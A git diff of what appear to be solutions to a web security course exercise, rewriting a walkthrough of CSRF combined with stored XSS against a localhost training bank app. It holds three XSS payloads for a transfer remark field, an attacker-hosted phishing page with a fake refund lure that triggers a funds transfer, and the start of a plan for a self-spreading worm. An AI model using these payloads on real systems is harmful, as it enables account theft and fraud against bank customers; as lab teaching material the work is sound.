@@ -3,7 +3,7 @@ Web Application Vulnerabilities -2
 ### Exercise 1: Cross Site Request Forgery (CSRF/XSRF)
 
 #### Task 1
-__Q__ 1. Briefly explain what CSRF/XSRF is in your own words (outline the roles and steps involved in XSRF attack).
+__Q 1. Briefly explain what CSRF/XSRF is in your own words (outline the roles and steps involved in XSRF attack).__
 
 __Solution__
 
@@ -34,70 +34,78 @@ __Solution:__ After examining the web request from the `Transfer Funds` page, th
 
 #### Task 4
 
-__Assume that you are a valid customer of your bank. Show how you can use XSRF
-to transfer money from another account to your account.__
-__Solution:__ In this attack, XSS vulnerability on the Account Details page is leveraged to perform CSRF.
-Follow the tutorial to install Nginx
-https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-debian-8
+__Assume that you are a valid customer of your bank. Show how you can use XSRF to transfer money from another account to your account.__
+__Solution:__ 
+- In this attack, XSS vulnerability on the Account Details page is leveraged to perform CSRF.
+- Run the Python HTTP server, where `error.html` is located
 
-After installation, start the Nginx server using 
-```sudo systemctl start nginx ```
-create a file ```error.html``` with the following script in your Nginx server folder.
+    ```bash
+        python -m SimpleHTTPServer 81
+    ```
 
-```
-<html>
-<body>
-<script>
-const queryString = window.location.search;
-console.log(queryString);
-const urlParams = new URLSearchParams(queryString);
-const accountNo = urlParams.get('x');
+    ```html
+    <html>
+    <body>
+        <script>
+            const queryString = window.location.search;
+            console.log(queryString);
+            const urlParams = new URLSearchParams(queryString);
+            const accountNo = urlParams.get('x');
 
-function getURL()
-{
+            function getURL() {
 
-const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
-http://localhost/htdocs/index.php?page=htbtransfer&srcacc=173105291&dstbank=41131337&dstacc=11111111&amount=1&remark=&htbtransfer=Transfer 
-window.open(url, "_blank");
-}
-</script>
-							
-<html>
-<body>
-We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button bellow to claim your refund plus 1 cent gift.
-<button onclick="getURL()"> Proceed </button>
+                const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc=" + accountNo + "&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
+                http://localhost/htdocs/index.php?page=htbtransfer&srcacc=173105291&dstbank=41131337&dstacc=11111111&amount=1&remark=&htbtransfer=Transfer 
+                window.open(url, "_blank");
+            }
+        </script>
+        <html>
+        <body>
+            We are very sorry for the inconvenience, you had an error while during the last transaction, please click the
+            button bellow to claim your refund plus 1 cent gift.
+            <button onclick="getURL()"> Proceed </button>
 
-</body>
-</html>
+        </body>
 
-```
-Three payloads were used due to the character limitations of the remark field.
-Go to Transfer Funds page and send the below three payloads in remark field to victim account from the attacker account.
+        </html>
+    ```
 
-Payload 1
-```script
-    <script>var x = document.getElementsByName("account")[0].value</script> 
-```
-Payload 2 
-```script
-    <script>function y(){window.open("http://localhost:81/error.html?x="+x, "_blank");}</script> 
-```
-Payload3
-```script
-    <a onclick="y()">Error please click here!!</a>
-```
-Once the payloads are transferred victim can see a ``` Error please click here!!!``` link in the remark field on the Account details page.
+- Three payloads were used due to the character limitations of the remark field.
+- Navigate to Transfer Funds page and send the below three payloads in remark field to victim account from the attacker account.
+
+    - Payload 1
+    ```javascript
+        <script>var x = document.getElementsByName("account")[0].value</script> 
+    ```
+    - Payload 2 
+    ```javascript
+        <script>function y(){window.open("http://localhost:81/error.html?x="+x, "_blank");}</script> 
+    ```
+    - Payload3
+    ```javascript
+
+        <a onclick="y()">Error please click here!!</a>
+    ```
+
+
+- Once the payloads are transferred victim can see a 
+`Error please click here!!!` link in the remark field on the Account details page.
 Assuming the victim is innocent and clicks the link.
-The page will be redirected to the error.html which is up and running in the attacker server (Nginx).
+The page will be redirected to the `error.html` which is up and running on the attacker server.
 
-If the victim clicks on the 'proceed' button, the funds will be transferred to the attacker's account, and the page is redirected to the bank web application.
+- If the victim clicks on the **proceed** button, the funds will be transferred to the attacker's account, and the page is redirected to the bank web application.
+
+TODO image placeholder
+
+
 
 
 #### Task 5.
 __5. Enhance your last attack such that it automatically spreads to other accounts and transfers your money from them too. Briefly explain your attack.__
 
-To perform this attack we have to make some assumptions to overcome some limitations,
-The assumption is that a bank account number is an eight-digit number with the same number in every digit place like 11111111,22222222,33333333....,99999999.
+__solution__
+- To perform this attack we have to make some assumptions to overcome some limitations.
+- The assumption is that a bank account number is an eight-digit number with the same number in every digit place like 11111111,22222222,33333333....,99999999.
 - Approaches and their limitations:
     - Approach 1: Bruteforce. to generate all account numbers and send the payload.
     - Limitation: Bruteforce is computationally costly.
